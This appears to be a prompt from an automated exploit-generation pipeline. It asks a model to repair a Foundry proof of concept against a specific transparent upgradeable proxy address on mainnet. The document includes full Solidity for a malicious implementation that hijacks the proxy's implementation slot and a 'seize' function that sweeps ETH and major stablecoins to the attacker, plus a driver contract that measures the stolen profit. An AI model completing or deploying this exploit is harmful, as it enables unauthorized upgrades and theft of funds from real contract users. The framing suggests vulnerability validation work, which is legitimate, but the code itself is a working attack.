You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Transparent proxy may expose an implementation-controlled upgrade path outside ProxyAdmin
- claim: The deployed contract is a `TransparentUpgradeableProxy`, whose `ifAdmin` modifier forwards non-admin calls to the implementation even when the calldata matches proxy admin selectors such as `upgradeTo` and `upgradeToAndCall`. If the live implementation at `0xcd2cd343cfbe284220677c78a08b1648bfa39865` also exposes those selectors (for example via UUPS-style upgrade functions), non-admin callers can reach implementation-defined upgrade logic through the proxy instead of being constrained to the proxy admin path. The implementation source is not present in this bundle, so exploitability cannot be confirmed here.
- impact: If the implementation behind this transparent proxy exposes a misconfigured or weaker upgrade entrypoint, an attacker could bypass the intended `ProxyAdmin`-only control plane, replace the implementation, and then steal funds, seize privileged behavior, or brick the protocol.
- exploit_paths: ["Attacker calls `upgradeTo(attackerImpl)` or `upgradeToAndCall(attackerImpl, data)` on the transparent proxy from a non-admin address", "`TransparentUpgradeableProxy.ifAdmin()` routes the call into `_fallback()` instead of executing the proxy's admin-only branch", "The proxy delegates the call to the current implementation at `0xcd2cd343cfbe284220677c78a08b1648bfa39865`", "If that implementation defines matching upgrade selectors, its own authorization logic\u2014not `ProxyAdmin` ownership\u2014decides whether the upgrade succeeds"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
}

contract MaliciousImplementation {
    bytes32 internal constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    bytes32 internal constant MARKER_VALUE = keccak256("qubit.finding.F-002.attacker-implementation");

    receive() external payable {}

    function marker() external pure returns (bytes32) {
        return MARKER_VALUE;
    }

    function upgradeTo(address newImplementation) external {
        assembly {
            sstore(IMPLEMENTATION_SLOT, newImplementation)
        }
    }

    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable {
        assembly {
            sstore(IMPLEMENTATION_SLOT, newImplementation)
        }
        if (data.length > 0) {
            (bool ok, bytes memory revertData) = newImplementation.delegatecall(data);
            if (!ok) {
                assembly {
                    revert(add(revertData, 32), mload(revertData))
                }
            }
        }
    }

    function seize(address recipient, address[] calldata tokens) external {
        uint256 nativeBalance = address(this).balance;
        if (nativeBalance > 0) {
            (bool nativeOk,) = payable(recipient).call{value: nativeBalance}("");
            require(nativeOk, "native sweep failed");
        }

        for (uint256 i = 0; i < tokens.length; ++i) {
            address token = tokens[i];
            (bool balanceOk, bytes memory balanceData) = token.staticcall(
                abi.encodeWithSelector(IERC20Minimal.balanceOf.selector, address(this))
            );
            if (!balanceOk || balanceData.length < 32) {
                continue;
            }

            uint256 balance = abi.decode(balanceData, (uint256));
            if (balance == 0) {
                continue;
            }

            (bool transferOk, bytes memory transferData) = token.call(
                abi.encodeWithSignature("transfer(address,uint256)", recipient, balance)
            );
            require(
                transferOk && (transferData.length == 0 || abi.decode(transferData, (bool))),
                "token sweep failed"
            );
        }
    }
}

contract FlawVerifier {
    address public constant TARGET_PROXY = 0x20E5E35ba29dC3B540a1aee781D0814D5c77Bce6;
    bytes32 public constant ATTACK_MARKER = keccak256("qubit.finding.F-002.attacker-implementation");

    address private _profitToken;
    uint256 private _profitAmount;

    bool public attempted;
    bool public upgradeCallSucceeded;
    bool public markerConfirmed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    address public deployedAttackImplementation;
    string public exploitPathUsed;
    bytes public lastFailureData;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (attempted) {
            return;
        }
        attempted = true;

        address[] memory candidates = _candidateTokens();
        uint256 ethBefore = address(this).balance;
        uint256[] memory tokenBalancesBefore = _snapshot(candidates);

        MaliciousImplementation attackerImpl = new MaliciousImplementation();
        deployedAttackImplementation = address(attackerImpl);

        bytes memory seizeCall = abi.encodeWithSignature(
            "seize(address,address[])",
            address(this),
            candidates
        );

        // Path stage 1: the attacker, as a non-admin address, calls the proxy with an admin selector.
        // Path stage 2: TransparentUpgradeableProxy.ifAdmin() should route the call into fallback for non-admin callers.
        // Path stage 3: the proxy delegates the call into the current implementation.
        // Path stage 4: if the implementation exposes matching upgrade selectors with weak auth, it upgrades the proxy.
        (bool ok, bytes memory revertData) = TARGET_PROXY.call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(attackerImpl),
                seizeCall
            )
        );

        if (ok) {
            upgradeCallSucceeded = true;
            exploitPathUsed = "upgradeToAndCall(address,bytes) via transparent proxy fallback";
        } else {
            lastFailureData = revertData;
            (ok, revertData) = TARGET_PROXY.call(
                abi.encodeWithSignature("upgradeTo(address)", address(attackerImpl))
            );

            if (ok) {
                upgradeCallSucceeded = true;
                exploitPathUsed = "upgradeTo(address) via transparent proxy fallback";

                (bool seizeOk, bytes memory seizeFailure) = TARGET_PROXY.call(seizeCall);
                if (!seizeOk) {
                    lastFailureData = seizeFailure;
                }
            } else {
                lastFailureData = revertData;
            }
        }

        markerConfirmed = _confirmMarker();
        hypothesisValidated = markerConfirmed;
        hypothesisRefuted = !markerConfirmed;

        _finalizeProfit(candidates, tokenBalancesBefore, ethBefore);

        // Concrete infeasibility condition when hypothesisRefuted == true:
        // the exact non-admin proxy call using upgrade selectors did not leave the proxy executing our replacement
        // implementation at this fork state. Mechanically, that means at least one mandatory path stage failed:
        // either the live implementation did not expose the selector, or its own authorization logic rejected the call,
        // or its upgrade routine refused this replacement implementation during execution.
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _confirmMarker() internal view returns (bool) {
        (bool ok, bytes memory data) = TARGET_PROXY.staticcall(
            abi.encodeWithSignature("marker()")
        );
        return ok && data.length == 32 && abi.decode(data, (bytes32)) == ATTACK_MARKER;
    }

    function _snapshot(address[] memory tokens) internal view returns (uint256[] memory balances) {
        balances = new uint256[](tokens.length);
        for (uint256 i = 0; i < tokens.length; ++i) {
            (bool ok, bytes memory data) = tokens[i].staticcall(
                abi.encodeWithSelector(IERC20Minimal.balanceOf.selector, address(this))
            );
            if (ok && data.length >= 32) {
                balances[i] = abi.decode(data, (uint256));
            }
        }
    }

    function _finalizeProfit(
        address[] memory tokens,
        uint256[] memory balancesBefore,
        uint256 ethBefore
    ) internal {
        uint256 ethDelta = address(this).balance > ethBefore ? address(this).balance - ethBefore : 0;
        if (ethDelta > 0) {
            _profitToken = address(0);
            _profitAmount = ethDelta;
        }

        for (uint256 i = 0; i < tokens.length; ++i) {
            (bool ok, bytes memory data) = tokens[i].staticcall(
                abi.encodeWithSelector(IERC20Minimal.balanceOf.selector, address(this))
            );
            if (!ok || data.length < 32) {
                continue;
            }

            uint256 afterBalance = abi.decode(data, (uint256));
            uint256 beforeBalance = balancesBefore[i];
            if (afterBalance > beforeBalance) {
                uint256 delta = afterBalance - beforeBalance;
                if (delta > _profitAmount) {
                    _profitToken = tokens[i];
                    _profitAmount = delta;
                }
            }
        }
    }

    function _candidateTokens() internal pure returns (address[] memory tokens) {
        tokens = new address[](8);
        tokens[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
        tokens[1] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC
        tokens[2] = 0xdAC17F958D2ee523a2206206994597C13D831ec7; // USDT
        tokens[3] = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // DAI
        tokens[4] = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599; // WBTC
        tokens[5] = 0x853d955aCEf822Db058eb8505911ED77F175b99e; // FRAX
        tokens[6] = 0x4Fabb145d64652a948d72533023f6E7A623C7C53; // BUSD
        tokens[7] = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA; // FEI
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: upgradeto(attackerimpl), upgradetoandcall(attackerimpl, data), _fallback(), 0xcd2cd343cfbe284220677c78a08b1648bfa39865, proxyadmin; generated code does not cover paths indexes: 0, 2, 3
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
